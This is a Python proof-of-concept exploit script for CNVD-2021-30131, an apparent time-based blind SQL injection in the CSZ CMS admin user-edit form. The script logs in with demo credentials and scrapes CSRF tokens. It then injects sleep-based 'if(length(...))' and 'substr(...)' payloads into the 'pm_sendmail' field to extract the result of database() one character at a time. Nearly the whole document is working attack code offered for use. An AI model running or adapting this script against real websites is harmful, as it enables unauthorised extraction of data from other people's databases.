'''
CNVD-2021-30131

'''

import requests
import time
from urllib.parse import urlencode

EMAIL = 'demo@cszcms.com'
PASSWORD = '123456'
TARGET = 'http://192.168.81.130'

SQL = 'database()'
SLEEP_TIME = 3 


LOGIN_URL = '/admin/login/check'
USER_EDIT_URL = '/admin/users/edit/1'
VUL_URL = '/admin/users/edited/1'

HEADERS = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
}

CHARS = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789@_.'

session = requests.session()

def getLoginCSRF():
    print('[+]start login')
    resp = session.get(TARGET + LOGIN_URL, headers = HEADERS)
    content = str(resp.content)
    pos = content.index('csrf_csz')
    csrf_csz = content[pos + 17 : pos + 49]
    return csrf_csz

def login(csrf_csz):
    data = {
        'csrf_csz': csrf_csz,
        'email' : EMAIL,
        'password' : PASSWORD
    }
    resp = session.post(TARGET + LOGIN_URL,data = data, headers = HEADERS)
    if 'window.location' in str(resp.content):
        print('[+]login success')
    else:
        print('[-]login failed')
        exit()

def getUserEditedCSRF():
    resp = session.get(TARGET + USER_EDIT_URL, headers = HEADERS)
    content = str(resp.content)
    pos = content.index('csrf_csz')
    csrf_csz = content[pos + 17 : pos + 49]
    return csrf_csz

def getSQLResultLength():
    print('[+]start query length of \'%s\'' % SQL)
    for i in range(1, 20):
        csrf_csz = getUserEditedCSRF()
        payload = '1 and if((length(%s)=%d),sleep(%d),1)' % (SQL, i, SLEEP_TIME)
        print(payload)
        startTime = time.time()
        userEdited(csrf_csz, payload)
        endTime = time.time()
        # print(endTime - startTime)
        if endTime - startTime > SLEEP_TIME:
            print('[+]length of \'%s\' is %d' % (SQL, i))
            return i
    return 0

def getSQLResult(length):
    print('[+]start \'%s\'' % SQL)
    result = ''
    for i in range(1, length+1):
        for j in CHARS:
            csrf_csz = getUserEditedCSRF()
            payload = '1 and if((substr(%s,%d,1)=\'%s\'),sleep(%d),1)' % (SQL, i, j, SLEEP_TIME)
            print(payload)
            startTime = time.time()
            userEdited(csrf_csz, payload)
            endTime = time.time()
            # print(endTime - startTime)
            if endTime - startTime > SLEEP_TIME:
                result = result + j
                print('[+]%s' % result)
                break
    print('[+]\'%s\' result is %s' % (SQL, result))

def userEdited(csrf_csz, payload):
    data = {
        'csrf_csz' : (None, csrf_csz),
        'name' : (None, 'abcdefg'),
        'email' : (None, EMAIL),
        'password' : (None, PASSWORD),
        'con_password' : (None, PASSWORD),
        'pm_sendmail' : (None, payload),
        'first_name' : (None, ''),
        'last_name' : (None, ''),
        'year' : (None, ''),
        'month' : (None, ''),
        'day' : (None, ''),
        'gender' : (None, ''),
        'address' : (None, ''),
        'phone' : (None, ''),
        'file_upload' : '',
        'picture' : (None, ''),
        'cur_password' : (None, PASSWORD),
        'submit' : (None, 'Save')
    }
    resp = session.post(TARGET + VUL_URL,files = data, headers = HEADERS)
    content = str(resp.content)


def main():
    csrf_csz = getLoginCSRF()
    login(csrf_csz)

    sqlLength = getSQLResultLength();
    getSQLResult(sqlLength)

if __name__ == '__main__':
    main()
